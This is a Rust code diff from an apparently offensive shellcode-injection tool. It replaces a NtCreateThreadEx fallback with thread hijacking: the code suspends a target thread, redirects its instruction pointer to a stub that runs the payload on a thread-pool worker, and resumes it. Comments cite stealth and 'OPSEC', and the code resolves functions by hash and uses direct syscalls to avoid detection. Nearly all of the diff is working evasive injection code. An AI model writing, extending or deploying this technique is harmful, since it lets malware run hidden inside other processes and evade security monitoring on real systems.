@@ -50,9 +50,12 @@
 //! # Fallback
 //!
 //! If no alertable thread is found in the target (required for APC delivery),
-//! this technique falls back to `NtCreateThreadEx` for stub execution only.
-//! The shellcode itself still runs on a thread pool worker thread via
-//! TpAllocWork/TpPostWork, so the actual payload execution remains stealthy.
+//! this technique falls back to **thread hijacking**: suspending an existing
+//! thread in the target, redirecting its instruction pointer to the stub, and
+//! resuming it. The stub executes on the hijacked thread, which then returns
+//! to its original execution. No new thread is created. The shellcode itself
+//! still runs on a thread pool worker thread via TpAllocWork/TpPostWork, so
+//! the actual payload execution remains stealthy.
 
 use crate::injection::{payload_has_valid_pe_headers, Injector};
 use anyhow::{anyhow, Result};
@@ -118,18 +121,17 @@ impl Injector for ThreadPoolInjector {
 /// ```
 #[cfg(all(windows, target_arch = "aarch64"))]
 unsafe fn inject_via_thread_pool_arm64(pid: u32, shellcode: &[u8]) -> Result<()> {
-    use winapi::um::winnt::{
-        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, PROCESS_QUERY_INFORMATION,
-        PROCESS_VM_OPERATION, PROCESS_VM_WRITE,
-    };
+    use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ};
+    use windows_sys::Win32::System::Threading::{PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_WRITE};
+    use crate::win_types::PAGE_READWRITE;
 
     // ── Step 1: Open target process ──────────────────────────────────────
     let access_mask = PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION;
 
     let mut client_id = [0u64; 2];
     client_id[0] = pid as u64;
-    let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
-    obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
+    let mut obj_attr: crate::win_types::OBJECT_ATTRIBUTES = std::mem::zeroed();
+    obj_attr.Length = std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32;
 
     let mut h_proc: usize = 0;
     let open_status = crate::syscall!(
@@ -357,11 +359,11 @@ unsafe fn inject_via_thread_pool_arm64(pid: u32, shellcode: &[u8]) -> Result<()>
     // ── Step 8: Execute stub via APC on an alertable thread ──────────────
     let apc_ok = try_execute_via_apc(h_proc, pid, stub_remote as usize);
     if !apc_ok {
-        log::warn!(
-            "ThreadPool/ARM64: no alertable thread in pid {}, using NtCreateThreadEx for stub",
+        tracing::warn!(
+            "ThreadPool/ARM64: no alertable thread in pid {}, using thread hijack for stub",
             pid
         );
-        execute_stub_via_thread(h_proc, stub_remote)?;
+        execute_stub_via_hijack(h_proc, pid, stub_remote)?;
     }
 
     close_h!(h_proc);
@@ -477,18 +479,17 @@ fn arm64_load64(stub: &mut Vec<u8>, reg: u8, val: u64) {
 /// It must only be called with valid PIDs and well-formed shellcode.
 #[cfg(all(windows, target_arch = "x86_64"))]
 unsafe fn inject_via_thread_pool(pid: u32, shellcode: &[u8]) -> Result<()> {
-    use winapi::um::winnt::{
-        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, PROCESS_QUERY_INFORMATION,
-        PROCESS_VM_OPERATION, PROCESS_VM_WRITE,
-    };
+    use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ};
+    use windows_sys::Win32::System::Threading::{PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_WRITE};
+    use crate::win_types::PAGE_READWRITE;
 
     // ── Step 1: Open target process ──────────────────────────────────────
     let access_mask = PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION;
 
     let mut client_id = [0u64; 2];
     client_id[0] = pid as u64;
-    let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
-    obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
+    let mut obj_attr: crate::win_types::OBJECT_ATTRIBUTES = std::mem::zeroed();
+    obj_attr.Length = std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32;
 
     let mut h_proc: usize = 0;
     let open_status = crate::syscall!(
@@ -749,16 +750,15 @@ unsafe fn inject_via_thread_pool(pid: u32, shellcode: &[u8]) -> Result<()> {
 
     let apc_ok = try_execute_via_apc(h_proc, pid, stub_remote as usize);
     if !apc_ok {
-        log::warn!(
-            "ThreadPool: no alertable thread found in pid {}, falling back to NtCreateThreadEx for stub execution",
+        tracing::warn!(
+            "ThreadPool: no alertable thread found in pid {}, falling back to thread hijack for stub execution",
             pid
         );
-        // Fallback: create a thread to execute the stub.
+        // Fallback: hijack an existing thread to execute the stub.
         // The stub itself calls TpAllocWork/TpPostWork, so the actual payload
-        // still runs on a thread pool worker. This fallback only creates a
-        // transient thread for the stub, which is short-lived and less
-        // suspicious than a thread running arbitrary shellcode directly.
-        execute_stub_via_thread(h_proc, stub_remote)?;
+        // still runs on a thread pool worker. This fallback reuses an existing
+        // thread — no new thread is created.
+        execute_stub_via_hijack(h_proc, pid, stub_remote)?;
     }
 
     // Close process handle (fire-and-forget injection).
@@ -772,7 +772,7 @@ unsafe fn inject_via_thread_pool(pid: u32, shellcode: &[u8]) -> Result<()> {
 /// Returns `true` if the APC was queued successfully, `false` otherwise.
 #[cfg(windows)]
 unsafe fn try_execute_via_apc(h_proc: *mut std::ffi::c_void, pid: u32, stub_addr: usize) -> bool {
-    use winapi::um::winnt::{PROCESS_QUERY_INFORMATION, THREAD_SET_CONTEXT};
+    use windows_sys::Win32::System::Threading::{PROCESS_QUERY_INFORMATION, THREAD_SET_CONTEXT};
 
     // Take a snapshot of all threads in the target process.
     let snap_hash = pe_resolve::hash_str(b"CreateToolhelp32Snapshot\0");
@@ -842,8 +842,8 @@ unsafe fn try_execute_via_apc(h_proc: *mut std::ffi::c_void, pid: u32, stub_addr
                 let mut h_thread: usize = 0;
                 let mut cid = [0u64; 2];
                 cid[0] = te_tid as u64;
-                let mut oa: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
-                oa.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
+                let mut oa: crate::win_types::OBJECT_ATTRIBUTES = std::mem::zeroed();
+                oa.Length = std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32;
 
                 let thread_access = (THREAD_SET_CONTEXT | PROCESS_QUERY_INFORMATION) as u64;
                 let open_ok = crate::syscall!(
@@ -891,65 +891,304 @@ unsafe fn try_execute_via_apc(h_proc: *mut std::ffi::c_void, pid: u32, stub_addr
     found
 }
 
-/// Fallback: execute the stub by creating a minimal thread.
+/// Fallback: execute the stub by hijacking an existing thread in the target
+/// process.
 ///
-/// This creates a transient thread whose only purpose is to run the short
-/// TpAllocWork/TpPostWork stub. The stub itself is ~80 bytes and completes
-/// in microseconds, after which the thread pool worker executes the actual
-/// payload.
+/// When no alertable thread is found for APC delivery, this approach suspends
+/// an existing thread, modifies its instruction pointer to the stub address,
+/// arranges for the stub to return to the thread's original code, and resumes
+/// the thread. No new remote thread is created — preserving the "No
+/// NtCreateThreadEx" OPSEC property.
+///
+/// On x86_64 the original RIP is written to [RSP - 8] and RSP is decremented;
+/// the stub's prologue/epilogue (`sub rsp, 0x38` / `add rsp, 0x38` / `ret`)
+/// naturally pops the saved RIP and restores the stack.
+///
+/// On AArch64 the link register (x30 / LR) is set to the original PC; the
+/// stub's `stp x29, x30` / `ldp x29, x30` / `ret` sequence preserves and
+/// returns through x30.
 #[cfg(windows)]
-unsafe fn execute_stub_via_thread(
+unsafe fn execute_stub_via_hijack(
     h_proc: *mut std::ffi::c_void,
+    pid: u32,
     stub_addr: *mut std::ffi::c_void,
 ) -> Result<()> {
-    use winapi::um::winnt::SYNCHRONIZE;
+    use windows_sys::Win32::System::Threading::{THREAD_GET_CONTEXT, THREAD_SET_CONTEXT, THREAD_SUSPEND_RESUME};
+    use crate::win_types::{CONTEXT, CONTEXT_FULL};
 
-    let ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
-        .ok_or_else(|| anyhow!("ThreadPool: ntdll not found for NtCreateThreadEx"))?;
-    let fn_hash = pe_resolve::hash_str(b"NtCreateThreadEx\0");
-    let fn_ptr = pe_resolve::get_proc_address_by_hash(ntdll_base, fn_hash)
-        .ok_or_else(|| anyhow!("ThreadPool: NtCreateThreadEx not found"))?
-        as *mut winapi::ctypes::c_void;
+    // Resolve Toolhelp32 functions for thread enumeration (no IAT entries).
+    let k32_base = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL) {
+        Some(b) => b,
+        None => return Err(anyhow!("ThreadPool/hijack: kernel32 not found")),
+    };
 
-    type NtCreateThreadExFn = unsafe extern "system" fn(
-        *mut *mut winapi::ctypes::c_void, // ThreadHandle
-        u32,                              // DesiredAccess
-        *mut winapi::ctypes::c_void,      // ObjectAttributes
-        *mut winapi::ctypes::c_void,      // ProcessHandle
-        *mut winapi::ctypes::c_void,      // StartRoutine
-        *mut winapi::ctypes::c_void,      // Argument
-        u32,                              // CreateFlags
-        usize,                            // ZeroBits
-        usize,                            // StackSize
-        usize,                            // MaximumStackSize
-        *mut winapi::ctypes::c_void,      // AttributeList
-    ) -> i32;
+    let snap_hash = pe_resolve::hash_str(b"CreateToolhelp32Snapshot\0");
+    let snap_fn: Option<unsafe extern "system" fn(u32, u32) -> *mut std::ffi::c_void> =
+        pe_resolve::get_proc_address_by_hash(k32_base, snap_hash).map(|a| std::mem::transmute(a));
+    let snap_fn = match snap_fn {
+        Some(f) => f,
+        None => return Err(anyhow!("ThreadPool/hijack: CreateToolhelp32Snapshot not found")),
+    };
 
-    let nt_create: NtCreateThreadExFn = std::mem::transmute(fn_ptr);
+    let t32f_hash = pe_resolve::hash_str(b"Thread32First\0");
+    let t32n_hash = pe_resolve::hash_str(b"Thread32Next\0");
+    let close_hash = pe_resolve::hash_str(b"CloseHandle\0");
 
-    let mut h_thread: *mut winapi::ctypes::c_void = std::ptr::null_mut();
-    let status = nt_create(
-        &mut h_thread,
-        SYNCHRONIZE,
-        std::ptr::null_mut(),
-        h_proc,
-        stub_addr,
-        std::ptr::null_mut(),
-        0,
-        0,
-        0,
-        0,
-        std::ptr::null_mut(),
-    );
-    if status < 0 {
+    let t32f_fn: Option<unsafe extern "system" fn(*mut std::ffi::c_void, *mut u8) -> i32> =
+        pe_resolve::get_proc_address_by_hash(k32_base, t32f_hash).map(|a| std::mem::transmute(a));
+    let t32n_fn: Option<unsafe extern "system" fn(*mut std::ffi::c_void, *mut u8) -> i32> =
+        pe_resolve::get_proc_address_by_hash(k32_base, t32n_hash).map(|a| std::mem::transmute(a));
+    let close_fn: Option<unsafe extern "system" fn(*mut std::ffi::c_void) -> i32> =
+        pe_resolve::get_proc_address_by_hash(k32_base, close_hash).map(|a| std::mem::transmute(a));
+
+    let (t32f_fn, t32n_fn, close_fn) = match (t32f_fn, t32n_fn, close_fn) {
+        (Some(f), Some(n), Some(c)) => (f, n, c),
+        _ => return Err(anyhow!("ThreadPool/hijack: Toolhelp32 functions not found")),
+    };
+
+    // TH32CS_SNAPTHREAD = 0x00000004
+    let snap = snap_fn(0x00000004, 0);
+    if snap.is_null() {
+        return Err(anyhow!("ThreadPool/hijack: CreateToolhelp32Snapshot failed"));
+    }
+
+    const TE_SIZE: usize = 28;
+    let mut te_buf = [0u8; TE_SIZE];
+    let size_bytes = (TE_SIZE as u32).to_le_bytes();
+    te_buf[0..4].copy_from_slice(&size_bytes);
+
+    let thread_access =
+        (THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT) as u64;
+
+    let mut hijacked = false;
+
+    if t32f_fn(snap, te_buf.as_mut_ptr()) != 0 {
+        loop {
+            let te_pid = u32::from_le_bytes([te_buf[12], te_buf[13], te_buf[14], te_buf[15]]);
+            let te_tid = u32::from_le_bytes([te_buf[8], te_buf[9], te_buf[10], te_buf[11]]);
+
+            if te_pid == pid && te_tid != 0 {
+                // Try to open this thread for hijacking.
+                let mut h_thread: usize = 0;
+                let mut cid = [0u64; 2];
+                cid[0] = te_tid as u64;
+                let mut oa: crate::win_types::OBJECT_ATTRIBUTES = std::mem::zeroed();
+                oa.Length = std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32;
+
+                let open_ok = crate::syscall!(
+                    "NtOpenThread",
+                    &mut h_thread as *mut _ as u64,
+                    thread_access,
+                    &mut oa as *mut _ as u64,
+                    cid.as_mut_ptr() as u64,
+                );
+                if let Ok(s) = open_ok {
+                    if s >= 0 && h_thread != 0 {
+                        let h_thread_ptr = h_thread as *mut std::ffi::c_void;
+
+                        // Suspend the thread.
+                        let mut suspend_count = 0i32;
+                        let susp = crate::syscall!(
+                            "NtSuspendThread",
+                            h_thread_ptr as u64,
+                            &mut suspend_count as *mut _ as u64,
+                        );
+                        match susp {
+                            Ok(st) if st >= 0 => {}
+                            _ => {
+                                crate::syscall!("NtClose", h_thread_ptr as u64).ok();
+                                // Try next thread.
+                                te_buf[4..].fill(0);
+                                te_buf[0..4].copy_from_slice(&size_bytes);
+                                if t32n_fn(snap, te_buf.as_mut_ptr()) == 0 {
+                                    break;
+                                }
+                                continue;
+                            }
+                        }
+
+                        // Get the thread's current context.
+                        let mut ctx: CONTEXT = std::mem::zeroed();
+                        ctx.ContextFlags = CONTEXT_FULL;
+                        let get_ctx = crate::syscall!(
+                            "NtGetContextThread",
+                            h_thread_ptr as u64,
+                            &mut ctx as *mut _ as u64,
+                        );
+
+                        match get_ctx {
+                            Ok(st) if st >= 0 => {
+                                // --- Save original instruction pointer for recovery ---
+                                #[cfg(target_arch = "x86_64")]
+                                let (saved_rip, saved_rsp) = (ctx.Rip, ctx.Rsp);
+                                #[cfg(target_arch = "aarch64")]
+                                let saved_pc = ctx.Pc;
+
+                                // --- Arch-specific hijack: modify context ---
+                                #[cfg(target_arch = "x86_64")]
+                                {
+                                    // Write the original RIP to [RSP - 8] so the
+                                    // stub's `ret` will pop it after restoring RSP.
+                                    let push_addr = saved_rsp - 8;
+                                    let mut written = 0usize;
+                                    let write_s = crate::syscall!(
+                                        "NtWriteVirtualMemory",
+                                        h_proc as u64,
+                                        push_addr as u64,
+                                        &saved_rip as *const _ as u64,
+                                        8u64,
+                                        &mut written as *mut _ as u64,
+                                    );
+                                    match write_s {
+                                        Ok(ws) if ws >= 0 && written == 8 => {}
+                                        _ => {
+                                            // Failed to write return address — abort
+                                            // hijack, resume thread at original IP.
+                                            crate::syscall!(
+                                                "NtResumeThread",
+                                                h_thread_ptr as u64,
+                                                0u64,
+                                            )
+                                            .ok();
+                                            crate::syscall!(
+                                                "NtClose",
+                                                h_thread_ptr as u64,
+                                            )
+                                            .ok();
+                                            te_buf[4..].fill(0);
+                                            te_buf[0..4].copy_from_slice(&size_bytes);
+                                            if t32n_fn(snap, te_buf.as_mut_ptr()) == 0 {
+                                                break;
+                                            }
+                                            continue;
+                                        }
+                                    }
+
+                                    // Set RSP to [RSP - 8] (where we just wrote the
+                                    // original RIP) and RIP to the stub.
+                                    ctx.Rsp = push_addr;
+                                    ctx.Rip = stub_addr as u64;
+                                }
+
+                                #[cfg(target_arch = "aarch64")]
+                                {
+                                    // Set x30 (LR) to the original PC.  The stub's
+                                    // stp x29, x30 / ldp x29, x30 / ret preserves
+                                    // and returns through LR.
+                                    ctx.Lr = saved_pc;
+                                    ctx.Pc = stub_addr as u64;
+                                }
+
+                                // --- Apply the modified context ---
+                                let set_ctx = crate::syscall!(
+                                    "NtSetContextThread",
+                                    h_thread_ptr as u64,
+                                    &ctx as *const _ as u64,
+                                );
+                                match set_ctx {
+                                    Ok(st2) if st2 >= 0 => {}
+                                    _ => {
+                                        // NtSetContextThread failed — the kernel-side
+                                        // context is unchanged. Just resume the thread
+                                        // and try the next one.
+                                        tracing::warn!(
+                                            "ThreadPool/hijack: NtSetContextThread failed, skipping thread {}",
+                                            te_tid
+                                        );
+                                        crate::syscall!(
+                                            "NtResumeThread",
+                                            h_thread_ptr as u64,
+                                            0u64,
+                                        )
+                                        .ok();
+                                        crate::syscall!(
+                                            "NtClose",
+                                            h_thread_ptr as u64,
+                                        )
+                                        .ok();
+                                        te_buf[4..].fill(0);
+                                        te_buf[0..4].copy_from_slice(&size_bytes);
+                                        if t32n_fn(snap, te_buf.as_mut_ptr()) == 0 {
+                                            break;
+                                        }
+                                        continue;
+                                    }
+                                }
+
+                                // Resume the hijacked thread.
+                                let mut resume_count = 0i32;
+                                let resume = crate::syscall!(
+                                    "NtResumeThread",
+                                    h_thread_ptr as u64,
+                                    &mut resume_count as *mut _ as u64,
+                                );
+
+                                crate::syscall!("NtClose", h_thread_ptr as u64).ok();
+
+                                match resume {
+                                    Ok(st) if st >= 0 => {
+                                        tracing::info!(
+                                            "ThreadPool: hijacked thread {} in pid {} for stub execution (no new thread created)",
+                                            te_tid,
+                                            pid,
+                                        );
+                                        hijacked = true;
+                                        break;
+                                    }
+                                    _ => {
+                                        // Resume failed — thread is left suspended,
+                                        // which is bad. Try to clean up.
+                                        tracing::warn!(
+                                            "ThreadPool: NtResumeThread failed on hijacked thread {}",
+                                            te_tid
+                                        );
+                                        // Attempt another resume.
+                                        crate::syscall!(
+                                            "NtResumeThread",
+                                            h_thread_ptr as u64,
+                                            0u64,
+                                        )
+                                        .ok();
+                                    }
+                                }
+                            }
+                            _ => {
+                                // NtGetContextThread failed — resume and try next.
+                                crate::syscall!(
+                                    "NtResumeThread",
+                                    h_thread_ptr as u64,
+                                    0u64,
+                                )
+                                .ok();
+                                crate::syscall!("NtClose", h_thread_ptr as u64).ok();
+                            }
+                        }
+                    }
+                }
+            }
+
+            if hijacked {
+                break;
+            }
+
+            // Advance to next thread.
+            te_buf[4..].fill(0);
+            te_buf[0..4].copy_from_slice(&size_bytes);
+            if t32n_fn(snap, te_buf.as_mut_ptr()) == 0 {
+                break;
+            }
+        }
+    }
+
+    close_fn(snap);
+
+    if !hijacked {
         return Err(anyhow!(
-            "ThreadPool: NtCreateThreadEx for stub failed: {:x}",
-            status
+            "ThreadPool/hijack: no suitable thread found in pid {} for hijacking",
+            pid
         ));
     }
-    if !h_thread.is_null() {
-        crate::syscall!("NtClose", h_thread as u64).ok();
-    }
+
     Ok(())
 }
 
